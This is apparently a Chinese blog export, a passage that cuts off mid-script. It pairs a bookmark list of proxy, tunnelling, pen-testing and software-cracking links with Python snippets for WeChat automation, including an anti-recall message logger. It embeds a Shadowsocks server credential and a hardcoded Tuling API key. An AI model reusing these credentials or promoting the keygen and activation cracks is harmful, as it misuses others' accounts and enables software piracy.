免费图床 帮助你快速生成静态网站的工具 内网穿透工具 NAP 渗透攻击 百度网盘高速下载工具 BaiduCDP 开源 人工智能生成动漫女生头像 ai生成妹子 Google 在线代理 Google镜像 hosts&amp;DNS工作原理 分享有意思有价值的网站 新一代隐私通信（电话/短信）助手 内网穿透管理平台，基于 Frp 改的客户端 小米球ngrok 国内免翻墙看 YouTube 永久免费梯子看 YouTube 有人总结的租房要点 后端社招面试经历 内网渗透相关 搜集了 LeetCode、HackRank、剑指 offer 等经典算法实现 程序员如何优雅的挣零花钱 开发工具的中文 Cheatsheet 全栈程序员用到的各种优秀资料 程序员找工作黑名单 测试你的英语单词 帮独立开发者赚钱的资源整理 聪明人应该如何背单词？ let’s encrypt 申请 https 证书 MongoDB 资源、库、工具、应用程序精选列表中文版 PAC 自动代理翻墙 Ngrok NatApp 微信本地化调试利器 常用的命令总结及各种实用工具 收集喜欢的网址 生成聚合收款二维码：支付宝、微信、QQ 钱包 下载网页模板软件 两行代码 搞定计数 移动端后台开发api签名验证 RESTful API 个人工具 Charles 手机抓包记录 内网穿透 服务管理平台 渗透测试系统 XSS Platform 内网穿透frp 用Proxychains给你的Shell加上代理 用Wireshark抓包分析网络通讯 Fiddler 进行HTTP请求调试 蓝灯最新版本下载 gif添加文字 Prometheus 服务器监控和 Grafana 看板 Elasticsearch入门教程之安装与基本使用 Grafana 文档（目录） Grafana是一个开源的指标量监测和可视化工具 Grafana系列教程 Grafana中踩过的坑 简单的文件服务 send firefox 表情包 搜集邮箱账户的工具 V2EX 撕逼大战 升级到HTTP/2，性能大提升 博客聚合网站 程序员主题相声 网页长截图 在线文件转换工具 基于深度学习对一些老照片自动着色并且修复 Linux 命令 如何优雅地使用Sublime Text3 去除图片背景 phantomjs Navicat Premium 12.1.11.0安装与激活 navicat-keygen navicat 12 激活 JetBrains 系列软件汉化包 redis lua 使用 implode.io 记录分享你的代码片段 开启您的内网穿透之旅 3步汉化sublime text3 Lantern 免费爬墙工具 topvpn MySQL 索引及查询优化总结 swagger-php VPN推荐 程序猿成长计划 Lumen 微服务生成 Swagger 文档 一个去掉图片背景的网站 Lantern是一款免费的科学上网软件 《科学上网翻墙教程》 文件中转 Jetbrains系列产品2018.3.2最新激活方法 《后端架构师技术图谱》 Swoole热更新 Win下必备神器之Cmder 经纬度行政区域查询 全景故宫 抓包软件 Fiddler 了解一下 很有意思的网站 解析b站 微信本地调试神器 PHP笔记 PHP 高级工程面试题汇总 RESTful API 最佳实践 隐私搜索 基于 Elixir-GraphQL-React 的新一代社区系统设计雏形 科学上网配置详解 Chrome+SwitchyOmega+Shadowsocks Proxy SwitchyOmega 使用指南 Chrome 扩展：The Fucking GitHub 查看、整理、搜索你已经 Star 过的项目 WSL 配置指北：打造 Windows 最强命令行 闲话macOS五：实用命令行 『 OAuth2.0』 『进阶』 授权模式总结 抓包分析Mitmproxy 提供免费HTTPS证书 经典编程书籍大全 GitHub 的 Restful HTTP API 设计分解 程序员想提高先改变你的编程思想，而不是代码量 MetaWeblog 博客同步 Shadowsocks科学上网及pac自动代理 科学上网之 SSH 隧道 内网穿透之 frp 科学上网之影梭(Shadowsocks) 有哪些鲜为人知，但是很有意思的网站 代码片段托管服务 google镜像google404.net google镜像jsproxy https://github.com/EtherDream/jsproxy 开源微信调试工具 WeChat Playground 预览版 Linux 懒人工具 - autojump 收藏地址 微信公众号排版编辑器 浅谈 XSS 攻击的那些事（附常用绕过姿势） 帮你百度 开源的google梯子 工具网站 Save Your Code in an Emergency 图床 使用图床 在线中文分词 chrome爬虫工具 Jetbrains系列产品2019.1.2最新激活方法http://idea.lanyus.com/ 钉钉自动打卡神器 【Jetbrains】Idea、Phpstorm、Pycharm、Webstorm等激活教程 谷歌chrome插件谷歌上网助手 开发版 VPN蚂蚁 Navicat Premium 12激活破解教程(亲测可用)(附上官网离线安装包和破解工具） 乌云镜像https://shuimugan.com/ 万能命令工具网站https://www.chongbuluo.com/thread-5982-1-1.html 网页转PDF 教你用教育网（IPV6）清洁上 Google 识别图片是否ps过 下载网易云音乐 你知道Windows上有哪些奇技淫巧 在线制作词云wordart.com 在线图片文字识别ocr提取网站https://www.wdku.net/ js ocr 谷歌访问助手 教你google 微信公号写手工具 帮你百度 将图片转成字符画 网页在线玩小霸王 微信群采集的网站 年度代码报告 万能工具站 miku.tools www.atoolbox.net www.toolnb.com/ 墙外赛风psiphon3 shadowsocks 34.97.235.209:56454:imwooI:aes-256-cfb Windows中的Shadowsocks客户端https://jsproxy-test.tk/ 图片搜索 免费透明体背景的图片下载库pinpng 部署PHP环境 Composer 中国全量镜像 UML 类图processon.com mac软件 在线导图mubu.com 下载百度文库 google镜像 206.189.135.241/ google.upupming.site 谷歌google镜像 那些离不开的 Chrome 扩展插件 工具箱 Emoji cheat sheet 速查表 解析经过 eval 加密的 JS google镜像google.0xgg.com 解析八进制权限数字 office 在线预览服务 Office 文档在线预览的几种方案 Elasticsearch 国内镜像https://thans.cn/mirror/elasticsearch.html MBTI职业性格测试最新版 有意思的迷宫游戏。 翻译 https://tingtalk.me/spoken-english/ 在线旋转视频 https://tingtalk.me/digital-life-tips/ https://www.aconvert.com/cn/video/rotate/ 打开即用的免费在线白板工具 https://witeboard.com/db103a80-e330-11e9-ba19-2db460254e5d 简单搜索 App：无广告的 Baidu http://www.searchcraft.cn/ Chrome 插件 https://tingtalk.me/chrome/ 翻墙指南 https://tingtalk.me/fq/ https://tingtalk.me/fq-diy/ 简历工具 https://resume.mdnice.com/ https://tingtalk.me/resume-tips/ 中文排版指南 https://tingtalk.me/typography/ Google 搜索技巧 https://tingtalk.me/google-search-tips/ 保险入门指南 https://tingtalk.me/personal-insurance/ 驾考指南 https://tingtalk.me/driving-test/ Windows 电脑：使用技巧https://tingtalk.me/windows/ 向日葵远程控制 https://sunlogin.oray.com/personal/ 写作技巧https://tingtalk.me/composition-seven-tips/ 1024课堂 https://1024casts.com/topics 自动采集文章兼发布文章 - 优化推广工具https://www.lmcjl.com/index/collectarticles/index.html?menu_id=65 api 测试工具 RunApi，欢迎使用：http://runapi.showdoc.cc 网盘搜索集合网站 http://www.chaonengsou.com/]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[有用的Python项目收集]]></title>
    <url>%2F2018%2F12%2F12%2F%E6%9C%89%E7%94%A8%E7%9A%84Python%E9%A1%B9%E7%9B%AE%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[高效微信公众号历史文章和阅读数据爬虫1234#git clone https://github.com/wonderfulsuccess/weixin_crawler$ cd weixin_crawler/project/#https://github.com/24OI/OI-wiki/$ python(3) ./main.py 编程竞赛123456git clone https://git.dev.tencent.com/scaffrey/OI-wiki.git -b coding-pages# 如果是 python3python3 -m http.server# 如果是 python2python2 -m SimpleHTTPServer 8888# 有些环境下找不到名叫 python3/python2 的可执行文件，不妨运行 python 试试 全网帮你抓取信息1234567891011121314# clone the repo$ git clone https://github.com/TheYahya/sherlock.git# change the working directory to sherlock$ cd sherlock# install the requirements$ pip3 install -r requirements.txt$ python3 sherlock.py --helpusage: sherlock.py [-h] [--version] [--verbose] [--quiet] [--tor] [--unique-tor] [--csv] [--site SITE_NAME] USERNAMES [USERNAMES ...]Sherlock: Find Usernames Across Social Networks (Version 0.2.0) 二维码1234567891011121314151617pip install qrcodeimport qrcode# 二维码内容data = "https://www.baidu.com"# 生成二维码img = qrcode.make(data=data)# 直接显示二维码img.show()# 保存二维码为文件# img.save("baidu.jpg")pip install zxingimport zxingreader = zxing.BarCodeReader()barcode = reader.decode("baidu.jpg")print(barcode.parsed) 本地区块链1234567//https://learnku.com/articles/23196pip install py-geth&gt;&gt;&gt; from geth import LiveGethProcess&gt;&gt;&gt; geth = LiveGethProcess()&gt;&gt;&gt; geth.start()&gt;&gt;&gt; geth = DevGethProcess('testing', '/tmp/some-other-base-dir/')&gt;&gt;&gt; geth.start() 虚拟环境安装123456789pip intsall virtualenv pip install virtualenvwrapper-win //windows下pip install virtualenvwrapper //linuxmkvirtualenv *envName* //创建一个虚拟环境 创建在用户家目录下workenon *envName* //激活环境rmvirtualenv *envName* //删除环境deactivate //退出环境worken //列出环境需要进入虚拟环境中，执行pip install即可 网易云音乐下载123456789101112131415161718192021222324252627282930313233343536373839404142434445464748$ pip3 install pymusic-dl$ music-dl --helpUsage: music-dl [OPTIONS] Search and download music from netease, qq, kugou, baidu and xiami. Example: music-dl -k "周杰伦"Options: --version Show the version and exit. -k, --keyword TEXT 搜索关键字 -s, --source TEXT 数据源目前支持qq netease kugou baidu xiami flac -c, --count INTEGER 搜索数量限制 -o, --outdir TEXT 指定输出目录 -x, --proxy TEXT 指定代理（如http://127.0.0.1:1087） -m, --merge 对搜索结果去重和排序（默认不去重） -v, --verbose 详细模式 --help Show this message and exit. λ music-dl -k '周杰伦' Searching '周杰伦' from ... QQ ... KUGOU ... NETEASE ... BAIDU ... XIAMI ... --------------------------- [ 0 ] QQ | 0:03:35 - 3.28MB - 周杰伦 - 告白气球 - 周杰伦的床边故事 [ 1 ] QQ | 0:03:59 - 3.66MB - 周杰伦 - 青花瓷 - 我很忙 [ 2 ] QQ | 0:04:29 - 4.12MB - 周杰伦 - 晴天 - 叶惠美 [ 3 ] QQ | 0:05:26 - 4.99MB - 周杰伦 - 轨迹 (伴奏) - 寻找周杰伦 [ 4 ] QQ | 0:04:16 - 3.92MB - 周杰伦 - 说好的幸福呢 - 魔杰座 [ 5 ] KUGOU | 0:03:35 - 3.28MB - 周杰伦 - 告白气球 - 周杰伦的床边故事 [ 6 ] KUGOU | 0:04:29 - 4.12MB - 周杰伦 - 晴天 - 叶惠美 [ 7 ] KUGOU | 0:03:57 - 3.62MB - 周杰伦 - 青花瓷 - 我很忙 [ 8 ] KUGOU | 0:03:43 - 3.41MB - 周杰伦 - 稻香 - 魔杰座 [ 9 ] KUGOU | 0:04:56 - 4.53MB - 周杰伦 - 不能说的秘密 - 不能说的秘密 电影原声带 [ 10 ] NETEASE | 0:03:12 - 2.21MB - 周杰伦、李玟 - 刀马旦 - Partners 拍档 [ 11 ] BAIDU | 0:04:28 - 22.38MB - 山弟 - 周杰伦 - 周杰伦 [ 12 ] BAIDU | 0:03:35 - 3.29MB - 周杰伦 - 告白气球 - 周杰伦的床边故事 [ 13 ] BAIDU | 0:03:59 - 3.65MB - 周杰伦 - 青花瓷 - 我很忙 [ 14 ] BAIDU | 0:04:30 - 4.14MB - 周杰伦 - 简单爱 - 婚礼歌手 幸福情歌精选 [ 15 ] BAIDU | 0:03:46 - 3.46MB - 周杰伦 - 夜曲 - 十一月的萧邦 [ 16 ] XIAMI | 0:03:40 - 3.61MB - 张学友 - 星晴 (Live) - 活出生命Live演唱会 [ 17 ] XIAMI | 0:03:15 - 2.98MB - Abby - 周杰伦香水广告BGM - 周杰伦香水广告 [ 18 ] XIAMI | 0:04:08 - 9.5MB - G.E.M.邓紫棋 - 龙卷风 - 龙卷风 [ 19 ] XIAMI | 0:04:34 - 4.19MB - 鲁瑾 - 周杰伦：夜曲 - 二十年的青春和往昔第五季 这一刻你依然如此动人 [ 20 ] XIAMI | 0:03:16 - 2.99MB - Abby - 周杰伦香水广告单曲（升key） - 周杰伦香水广告 --------------------------- 请输入下载序号，支持形如 0 3-5 8 的格式，输入 N 跳过下载 股票行情12345678910111213141516171819pip instasll tushareimport tushare as tsts.set_token('你的token')pro = ts.pro_api()data = pro.stock_basic(exchange_id='', is_hs='', fields='symbol,name,is_hs,list_date,list_status')print(data)# ''表示获取全部https://www.makcyun.top/python_data_analysis01.html data = data.set_index(data['list_date'])data = data['2017']print(data.head())# 结果 ts_code symbol name list_status list_date is_hslist_date 2017-12-25 001965.SZ 001965 招商公路 L 2017-12-25 S2017-03-24 002774.SZ 002774 快意电梯 L 2017-03-24 N2017-01-12 002824.SZ 002824 和胜股份 L 2017-01-12 N2017-01-06 002838.SZ 002838 道恩股份 L 2017-01-06 N2017-01-24 002839.SZ 002839 张家港行 L 2017-01-24 S 使用python生成微信好友地域分析12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394# -*- coding: UTF-8 -*-from wxpy import *from wxpy import *from os import pathimport re, jiebaimport matplotlib.pyplot as pltfrom wordcloud import WordCloud,ImageColorGeneratorimport matplotlib.font_manager as fm# 初始化一个机器人对象https://zhuanlan.zhihu.com/p/60723803# cache_path缓存路径，给定值为第一次登录生成的缓存文件路径bot = Bot()#获取好友列表(包括自己)my_friends = bot.friends(update=False)'''stats_text 函数：帮助我们简单统计微信好友基本信息简单的统计结果的文本 :param total: 总体数量 :param sex: 性别分布 :param top_provinces: 省份分布 :param top_cities: 城市分布 :return: 统计结果文本'''print(my_friends.stats_text())# 清洗数据，生成词云图#获取当前的项目文件加的路径#读取停用词表stopwords_path='static/stopwords.txt'#定义个函数式用于分词def jiebaclearText(text): #定义一个空的列表，将去除的停用词的分词保存 mywordList=[] #进行分词 seg_list=jieba.cut(text,cut_all=False) #将一个generator的内容用/连接 listStr='/'.join(seg_list) listStr = listStr.replace("class","") listStr = listStr.replace("span", "") listStr = listStr.replace("emoji", "") #打开停用词表 f_stop=open(stopwords_path,encoding="utf8") #读取 try: f_stop_text=f_stop.read() finally: f_stop.close()#关闭资源 #将停用词格式化，用\n分开，返回一个列表 f_stop_seg_list=f_stop_text.split("\n") #对默认模式分词的进行遍历，去除停用词 for myword in listStr.split('/'): #去除停用词 if not(myword.split()) in f_stop_seg_list and len(myword.strip())&gt;1: mywordList.append(myword) return ' '.join(mywordList)# 生成词云图def make_wordcloud(text1,i): bg = plt.imread(r"image/heart.jpg") # 生成 wc = WordCloud(# FFFAE3 background_color="#FFFFFF", # 设置背景为白色，默认为黑色 width=990, # 设置图片的宽度 height=440, # 设置图片的高度 mask=bg, margin=10, # 设置图片的边缘 max_font_size=70, # 显示的最大的字体大小 random_state=20, # 为每个单词返回一个PIL颜色 font_path='static/simkai.ttf' # 中文处理，用系统自带的字体 ).generate(text1) # 为图片设置字体 my_font = fm.FontProperties(fname='static/simkai.ttf') # 图片背景 bg_color = ImageColorGenerator(bg) # 开始画图 plt.imshow(wc.recolor(color_func=bg_color)) # 为云图去掉坐标轴 plt.axis("off") # 画云图，显示 # 保存云图 wc.to_file(r"image/render_0%d.png"%i)# 微信昵称nick_name = ''# 微信个性签名wx_signature = ''for friend in my_friends: # 微信昵称：NickName nick_name = nick_name + friend.raw['NickName'] # 个性签名：Signature wx_signature = wx_signature + friend.raw['Signature']nick_name = jiebaclearText(nick_name)wx_signature = jiebaclearText(wx_signature)make_wordcloud(nick_name,1)make_wordcloud(wx_signature,2) 检测微信好友是否把你删除1234567891011121314151617181920212223242526272829303132333435通过Pyhton登录网页版微信，给你所有好友发送 జ్ఞా 这个特殊符号，由于微信的bug，对方收不到这个特殊符号，只要有人删了你，你的微信对话页面就会显示对方已经把你删除发送失败。pip install itchatimport itchatimport time itchat.auto_login(hotReload=True) # 热加载 print('检测结果可能会引起不适。')print('检测结果请在手机上查看，此处仅显示检测信息。')print('消息被拒收为被拉黑， 需要发送验证信息为被删。')print('没有结果就是好结果。')print('检测1000位好友需要34分钟， 以此类推。')print('为了你的账号安全着想，这个速度刚好。')print('在程序运行期间请让程序保持运行，网络保持连接。')print('请不要从手机端手动退出。')input('按ENTER键继续...') friends = itchat.get_friends(update=True)lenght = len(friends) for i in range(1, lenght): # 微信bug，用自己账户给所有好友发送"ॣ ॣ ॣ"消息，当添加自己为好友时，只有自己能收到此信息，如果没添加自己为好友\ # 没有人能收到此信息，笔者此刻日期为2019/1/6 8:30，到目前为止微信bug还没修复。 # 所以迭代从除去自己后的第二位好友开始 range(1, lenght)。 itchat.send("జ్ఞా", toUserName=friends[i]['UserName']) print(f'检测到第&#123;i&#125;位好友: &#123;str(friends[i]["NickName"]).center(20, " ")&#125;') # 发送信息速度过快会被微信检测到异常行为。https://www.qingwei.tech/programe-develops/python/1268.html time.sleep(2) print('已检测完毕，请在手机端查看结果。') itchat.run() 分析你的微信好友签名12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import itchatimport reimport jiebaimport matplotlib.pyplot as pltfrom wordcloud import WordCloud, ImageColorGeneratorfrom scipy.misc import imread # 这是一个处理图像的函数https://juejin.im/post/5ca4c7d7f265da30d34ba228# -*- coding: utf-8 -*-#导入模块from wxpy import *'''微信机器人登录有3种模式，(1)极简模式:robot = Bot()(2)终端模式:robot = Bot(console_qr=True)(3)缓存模式(可保持登录状态):robot = Bot(cache_path=True)'''#初始化机器人，选择缓存模式（扫码）登录robot = Bot(cache_path=True)#获取好友、群、公众号信息robot.chats()#获取好友的统计信息Friends = robot.friends()print(Friends.stats_text())sign_list=[]itchat.auto_login(hotReload=True)itchat.send(u'Hello,world','filehelper')friends = itchat.get_friends(update=True)[0:]print('开始获取微信好友个性签名.....')for i in friends: signature = i["Signature"].strip().replace("span", "").replace("class", "").replace("emoji", "") #过滤掉表情 #rep = re.compile("&lt; =.+/&gt;") rep = re.compile("[^\u4e00-\u9fa5^]") nickName=i["NickName"] signature = rep.sub("", signature) sign_list.append(signature)text=''.join(sign_list)wordlist_jieba = jieba.cut(text, cut_all=True)wl_space_split = ' '.join(wordlist_jieba)back_color = imread('./mao.jpg')# 词云my_wordcloud = WordCloud( background_color='white', # 背景颜色 max_words=2000, # 最大词数 mask=back_color, # 以该参数值作图绘制词云，这个参数不为空时，width和height会被忽略 max_font_size=100, # 显示字体的最大值 font_path='C:/Windows/Fonts/simfang.ttf', # 指定字体文件 解决显示口字型乱码问题， random_state=42, # 为每个词返回一个PIL颜色 )# 用wl_space_split生成词云my_wordcloud.generate(wl_space_split)# 基于彩色图像 生成响应的色彩image_colors = ImageColorGenerator(back_color)# 显示图片# plt.imshow(my_wordcloud)# 关闭坐标轴# plt.axis('off')# 绘制词云plt.figure()plt.imshow(my_wordcloud.recolor(color_func=image_colors))plt.axis('off')# 保存图片my_wordcloud.to_file('ciyun.png') 处理 Python 中的时区12345678910111213141516171819202122232425262728293031323334353637pip install pytz&gt;&gt;&gt; from datetime import datetime, timedelta&gt;&gt;&gt; from pytz import timezone&gt;&gt;&gt; import pytz&gt;&gt;&gt; utc = pytz.utc&gt;&gt;&gt; utc.zone'UTC'&gt;&gt;&gt; beijing = timezone('Asia/Shanghai')&gt;&gt;&gt; beijing.zone'Asia/Shanghai'&gt;&gt;&gt; tokyo = timezone('Asia/Tokyo')&gt;&gt;&gt; tokyo.zone'Asia/Tokyo'第一种是使用pytz库提供的 localize() 方法。这用于本地化一个没有时区信息的日期时间:&gt;&gt;&gt; fmt = '%Y-%m-%d %H:%M:%S %Z%z'&gt;&gt;&gt; loc_dt = beijing.localize(datetime(2018, 10, 27, 6, 0, 0))&gt;&gt;&gt; print(loc_dt.strftime(fmt))'2018-10-27 06:00:00 CST+0800'第二种方法是使用标准 astimezone() 方法转换现有的本地化时间：&gt;&gt;&gt; jp_dt = loc_dt.astimezone(tokyo)&gt;&gt;&gt; jp_dt.strftime(fmt)'2018-10-27 07:00:00 JST+0900'处理时间的首选方法是始终以UTC工作，仅在生成输出以供人类读取时转换为本地时间:&gt;&gt;&gt; utc_dt = datetime(2018, 10, 27, 6, 0, 0, tzinfo=utc)&gt;&gt;&gt; loc_dt = utc_dt.astimezone(beijing)&gt;&gt;&gt; loc_dt.strftime(fmt)'2018-10-27 14:00:00 CST+0800'此库还允许使用本地时间进行日期算术，例如计算北京和东京的时差：&gt;&gt;&gt; timestamp = datetime.utcnow()&gt;&gt;&gt; dt_cn = beijing.localize(timestamp)&gt;&gt;&gt; dt_jp =tokyo.localize(timestamp)&gt;&gt;&gt; x = dt_cn - dt_jp&gt;&gt;&gt; int(x.total_seconds()/3600)1 Python生成微信好友位置分布图1234567891011121314151617181920212223242526272829303132333435import itchatfrom pyecharts import Map#http://shuaiguoer.com/%E5%BE%AE%E4%BF%A1%E5%A5%BD%E5%8F%8B%E4%BD%8D%E7%BD%AE%E5%88%86%E5%B8%83%E5%9B%BE/List = []a = &#123;&#125;name = []value = []# 登录微信itchat.login()# 获取所有好友信息owner = itchat.get_friends()# 获取所有好友的所在位置for i in owner: province = i['Province'] List.append(province)# 获取每个位置对应的好友人数for s in List: if List.count(s) &gt;= 1: a[s] = List.count(s)# 把去重后的位置添加到列表name中for j in a: name.append(j)# 把每个位置对应的好友人数添加到列表values中for v in a.values(): value.append(v)# 生成地图maps = Map('微信好友位置分布图', width=1500, height=900) # 设置地图的宽和高# 把数据添加到地图中maps.add('', name, value, maptype='china', is_visualmap=True, visual_text_color='#000', is_label_show=True, visual_range=[0, 20])# is_visualmap ---&gt; 是否使用视觉映射组件# visual_text_color ---&gt; 两端文本颜色# is_label_show ---&gt; 是否正常显示标签。标签即各点的数据项信息# visual_range ---&gt; 指定允许的最小值与最大值maps.render('微信好友位置分布图.html') # 生成HTML文件 图灵机器人与指定的好友微信聊天123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899import itchatimport http.clientimport json # 监听人的微信idtouserNameId = '@becc4377a98a6df74fafc1192a3dd045'fromuserId='d3aef9a75e2b51430683ffeb386f0564'tulingDomain='openapi.tuling123.com'tulingOpenapiUrl='http://'+ tulingDomain + '/openapi/api/v2'# 聊天计数count= 0 # 监听接收到的文件信息@itchat.msg_register(itchat.content.TEXT)def reply_msg(msg): print(msg) # 指定好友回复特定消息 if msg['FromUserName'] == touserNameId and msg['ToUserName'] == touserNameId: global count # 图灵机器人 robbot0 = 'appkey0' # 图灵机器人1 robbot1 = 'appkey1' # 图灵机器人2 robbot2 = 'appkey2' # 图灵机器人3 robbot3 = 'appkey3' # 图灵机器人4 robbot4 = 'appkey4' count += 1 temp= 'robbot'+ str(count//98) usedRobbot =locals()[temp] print("收到：", msg.text) info = msg.text headers = &#123; # heard部分直接通过chrome部分request header部分 'Accept': 'application/json, text/plain, */*', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.8', 'Connection': 'keep-alive', 'Content-Length': '14', # get方式提交的数据长度，如果是post方式，转成get方式：【id=wdb&amp;pwd=wdb】 'Content-Type': 'application/x-www-form-urlencoded', 'Referer': 'http://10.1.2.151/', 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.23 Mobile Safari/537.36' &#125; data = &#123; "reqType":0, "perception": &#123; "inputText": &#123; "text": info &#125;, "selfInfo": &#123; "location": &#123; "city": "北京", "province": "北京", "street": "信息路" &#125; &#125; &#125;, "userInfo": &#123; "apiKey": usedRobbot, "userId": "me" &#125; &#125; # 这里是为了找到 id 包含 FromUserName 和 ToUserName print(data) conn = http.client.HTTPConnection(tulingDomain) header = &#123;"Content-type": "application/json"&#125; conn.request(method="POST", url=tulingOpenapiUrl, headers=header, body=json.dumps(data)) response = conn.getresponse() # print(response.status) # print(response.reason) res = response.read() # print(res) resp = json.loads(res) #print(resp) #print(type(resp)) reponseType = resp['results'][0]['values'] print(reponseType) print(type(reponseType)) #str = input("回复：") itchat.send(reponseType['text'],toUserName=touserNameId) if __name__ == '__main__': # 退出程序以后还暂存登录状态 https://blog.csdn.net/yan88888888888888888/article/details/89373626 itchat.auto_login(hotReload=True) # 给文件助手发消息 itchat.send("文件助手你好哦", toUserName="filehelper") itchat.run() 图灵机器人回复微信12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from wxpy import *import wx_friend# 微信机器人，缓存登录信息bot = Bot(cache_path=True)@bot.register(msg_types=FRIENDS)def auto_reply(msg): """自动接受好友请求""" wx_friend.auto_accept_friends(msg)@bot.register(chats=Friend)def auto_reply(msg): """自动回复好友""" if msg.type == TEXT: wx_friend.auto_reply(msg) elif msg.type == RECORDING: return '不听不听，王八念经' else: passembed()""" 免费申请图灵机器人，获取api_key 图灵机器人免费申请地址 http://www.tuling123.com"""tuling = Tuling(api_key='7c8cdb56b0dc4450a8deef30a496bd4c')def auto_reply(msg): """回复消息，并返回答复文本""" return tuling.do_reply(msg)if __name__ == '__main__': """ 直接点击测试图灵机器人 此apikey为wxpy自带apikey，有使用次数限制，建议自己免费申请一个 图灵机器人免费申请地址 http://www.tuling123.com """ apikey = '7c8cdb56b0dc4450a8deef30a496bd4c' api_url = 'http://www.tuling123.com/openapi/api' data = &#123;'key': apikey, 'info': '你好'&#125; req = requests.post(api_url, data=data).text replys = json.loads(req)['text'] print(replys) bot = Bot() def auto_accept_friends(msg): """自动接受好友https://github.com/pig6/wxrobot/blob/master/wx_friend.py""" # 接受好友请求 new_friend = msg.card.accept() # 向新的好友发送消息 new_friend.send('我已自动接受了你的好友请求') def auto_reply(msg): """自动回复""" # 关键字回复 or 图灵机器人回复 keyword_reply(msg) or tuling_reply(msg) def keyword_reply(msg): """关键字回复""" if '你叫啥' in msg.text or '你叫啥名字' in msg.text: return msg.reply('沃德天·维森莫·拉莫帅·帅德布耀') pass def tuling_reply(msg): """图灵机器人回复""" tuling_robot.auto_reply(msg) 微信防撤回123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131#!/usr/bin/env python3# -*- coding: utf-8 -*-__author__ = 'jiangwenwen'import itchatfrom itchat.content import *import timeimport reimport osprint("该程序由里客云资源站开发，网址：likeyunba.com https://segmentfault.com/a/1190000018691537")print("作者:TANKING")print("打开程序会弹出一个二维码，微信扫码")print("如果二维码弹不出，那就在你这个程序的同一个目录下找到QR.png双击打开扫码")print("扫码后，出现Start auto replying就可以实时监控消息了...")msg_information = &#123;&#125;# 针对表情包的内容face_bug = None@itchat.msg_register([TEXT, PICTURE, FRIENDS, CARD, MAP, SHARING, RECORDING, ATTACHMENT, VIDEO], isFriendChat=True, isMpChat=True)def handle_receive_msg(msg): global face_bug # 接收消息的时间 msg_time_rec = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) # 在好友列表列表中查询发送信息的好友昵称 msg_from = itchat.search_friends(userName=msg['FromUserName'])['NickName'] # 信息发送的时间 msg_time = msg['CreateTime'] # 每条信息的ID msg_id = msg['MsgId'] # 储存信息的内容 msg_content = None # 储存分享的连接，比如分享的文章和音乐 msg_share_url = None # 如果发送的消息是文本或者好友推荐 if msg['Type'] == 'Text' or msg['Type'] == 'Friends': msg_content = msg['Text'] print(msg_content) # 如果发送的消息是附件，视频，图片，语音 elif msg['Type'] == 'Attachment' or msg['Type'] == 'Video' \ or msg['Type'] == 'Picture'\ or msg['Type'] == 'Recording': # 内容为下载文件名 msg_content = msg['FileName'] msg['Text'](str(msg_content)) # 如果消息是推荐的名片 elif msg['Type'] == 'Card': # 内容是推荐人的昵称和性别 msg_content = msg['RecommendInfo']['NickName'] + '的名片' if msg['RecommendInfo']['Sex'] == 1: msg_content += '性别为男' else: msg_content += '性别为女' print(msg_content) # 如果消息为分享的位置信息 elif msg['Type'] == 'Map': x, y, location = re.search( "&lt;location x=\"(.*?)\" y=\"(.*?)\".*label=\"(.*?)\".*", msg['OriContent']).group(1, 2, 3) if location is None: # 内容为详细地址 msg_content = r'纬度-&gt;' + x.__str__() + "经度-&gt;" + y.__str__() else: msg_content = r"" + location # 如果消息是分享的音乐或者文章，详细的内容为文章的标题或者分享的名字 elif msg['Type'] == 'Sharing': msg_content = msg['Text'] msg_share_url = msg['Url'] print(msg_share_url) face_bug = msg_content # 将信息存储在字典中，每一个msg_id对应一条消息 msg_information.update( &#123; msg_id: &#123; "msg_from": msg_from, "msg_time": msg_time, "msg_time_rec": msg_time_rec, "msg_type": msg['Type'], "msg_content": msg_content, "msg_share_url": msg_share_url &#125; &#125;)#这个是用于监听是否有friend消息撤回@itchat.msg_register(NOTE, isFriendChat=True, isGroupChat=True, isMpChat=True)def information(msg): # 这里如果这里的msg['Content']中包含消息撤回和id，就执行下面的语句 if '撤回了一条消息' in msg['Content']: old_msg_id = re.search("\&lt;msgid\&gt;(.*?)\&lt;\/msgid\&gt;", msg['Content']).group(1) # 得到消息 old_msg = msg_information.get(old_msg_id) print(old_msg) # 如果发送的是表情 if len(old_msg_id)&lt;11: itchat.send_file(face_bug, toUserName='filehelper') # 发送撤回的提示给文件助手 else: msg_body = "【"\ + old_msg.get('msg_from') + "撤回了】\n"\ + old_msg.get("msg_type") + "消息:" + "\n"\ + old_msg.get("msg_time_rec") + "\n"\ + r"" + old_msg.get("msg_content") # 如果分享的文件被撤回了，那么就将分享的url加在msg_body中发送给文件助手 if old_msg['msg_type'] == "Sharing": msg_body += "\n就是这个链接&gt;" + old_msg.get('msg_share_url') # 将撤回消息发送到文件助手 itchat.send_msg(msg_body, toUserName="filehelper") # 有文件的话也要将文件发送回去 if old_msg["msg_type"] == "Picture"\ or old_msg["msg_type"] == "Recording"\ or old_msg["msg_type"] == "Video"\ or old_msg["msg_type"] == "Attachment": file = "@fil@%s" % (old_msg['msg_content']) itchat.send(msg=file, toUserName='filehelper') os.remove(old_msg['msg_content']) # 删除字典旧信息 msg_information.pop(old_msg_id)itchat.auto_login(hotReload=True)itchat.run() 自动加群12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 #coding=utf-8from wxpy import *base_bot = Bot(True)# 查找指定群聊群聊 ， 确保扫码微信中有 “123” 这个群group = base_bot.groups().search('123')# 自动接受新的好友请求@base_bot.register(msg_types=FRIENDS)def auto_accept_friends(msg): if '加好友' in msg.text.lower(): # 接受好友请求 new_friend = base_bot.accept_friend(msg.card) # new_friend = msg.card.accept() # 向新的好友发送消息 